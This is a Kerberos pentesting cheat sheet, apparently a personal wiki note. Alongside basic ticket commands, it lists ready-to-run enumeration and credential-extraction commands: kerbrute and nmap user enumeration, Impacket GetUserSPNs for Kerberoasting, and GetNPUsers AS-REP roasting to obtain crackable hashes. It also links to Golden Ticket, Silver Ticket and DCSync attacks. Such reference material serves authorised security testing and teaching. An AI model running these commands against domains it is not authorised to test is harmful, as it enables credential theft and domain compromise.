**Kerberos** is a network authentication protocol designed to provide secure user authentication over insecure networks. 
Kerberos uses tickets to allow nodes to prove their identity over non-secure networks without transmitting passwords. The protocol involves a Key Distribution Center (KDC) that includes an Authentication Server (AS) and a Ticket Granting Server (TGS).

# Connect
## kinit - Get TGT
```bash
# Request Ticket Granting Ticket
kinit username@DOMAIN.COM

# With password
echo 'password' | kinit username@DOMAIN.COM

# Check tickets
klist

# Destroy tickets
kdestroy
```

## Impacket
```bash
# Get TGT
getTGT.py DOMAIN/username:password

# Use ticket
export KRB5CCNAME=username.ccache

# Request service ticket
getST.py -spn service/hostname DOMAIN/username -k -no-pass
```

# Enumeration
## User enumeration
```bash
# Using kerbrute
kerbrute userenum --dc target.com -d DOMAIN.COM users.txt

# Using Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt target.com
```

## SPN Enumeration (Service Discovery)
Service Principal Names (SPNs) identify services running under specific accounts and are prime targets for Kerberoasting attacks.
```bash
# Using GetUserSPNs (Impacket)
GetUserSPNs.py DOMAIN/username:password -dc-ip target.com

# Without credentials (requires access to DC)
GetUserSPNs.py -request -dc-ip target.com DOMAIN/username

# From Windows
setspn -T DOMAIN.COM -Q */*
```

## AS-REP Roastable Users
Users with *"Do not require Kerberos preauthentication"* enabled can have their password hashes extracted without valid credentials.
```bash
# Using GetNPUsers (Impacket)
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip target.com -format hashcat

# Specific user
GetNPUsers.py DOMAIN/username -dc-ip target.com -no-pass

# From Windows with PowerView
Get-DomainUser -PreauthNotRequired
```

# Attack Vectors
- [[ASREPRoast]]
- [[DCSync]]
- [[Silver Ticket]]
- [[Golden Ticket]]
- [[Kerberoasting]]


# Kerberos Ticket Types
| Ticket         | Description               | Use Case                |
|----------------|---------------------------|-------------------------|
| TGT            | Ticket Granting Ticket    | Initial authentication  |
| TGS            | Ticket Granting Service   | Service access          |
| Golden Ticket  | Forged TGT                | Full domain access      |
| Silver Ticket  | Forged TGS                | Specific service access |


# References
- [https://hackviser.com/tactics/pentesting/services/kerberos](https://hackviser.com/tactics/pentesting/services/kerberos)